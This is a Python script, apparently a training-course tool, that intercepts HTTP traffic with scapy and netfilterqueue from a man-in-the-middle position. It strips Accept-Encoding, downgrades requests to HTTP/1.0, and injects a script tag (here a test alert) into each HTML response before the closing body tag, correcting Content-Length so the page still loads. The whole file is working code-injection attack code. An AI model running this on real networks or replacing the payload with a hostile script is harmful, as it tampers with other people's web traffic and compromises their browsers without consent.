#  Copyright (c) 2019. - ciphyr
#  Email: ciphyr[at]protonmail.com
#
#  Licensed under the Apache License, Version 2.0 (the "License");
#  You may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#  http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.


# Future improvement
# Add argparse

import scapy.all as scapy
import netfilterqueue
import re


def set_load(pkt, load):
    pkt[scapy.Raw].load = load
    del pkt[scapy.IP].len
    del pkt[scapy.IP].chksum
    del pkt[scapy.TCP].chksum
    return pkt


def process_packet(pkt):
    scapy_packet = scapy.IP(pkt.get_payload())
    if scapy_packet.haslayer(scapy.TCP):

        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")

            if scapy_packet.haslayer(scapy.Raw):
                load = scapy_packet[scapy.Raw].load

                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                load = load.replace("HTTP/1.1", "HTTP/1.0")

                if load != scapy_packet[scapy.Raw].load:
                    new_packet = set_load(scapy_packet, load)
                    pkt.set_payload(str(new_packet))

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")

            if scapy_packet.haslayer(scapy.Raw):
                load = scapy_packet[scapy.Raw].load
                inject_code = '<script>alert("test")</script>'
                load = load.replace("</body>", inject_code + "</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(inject_code)
                    load = load.replace(content_length, str(new_content_length))

                if load != scapy_packet[scapy.Raw].load:
                    new_packet = set_load(scapy_packet, load)
                    pkt.set_payload(str(new_packet))

    pkt.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print(" ")
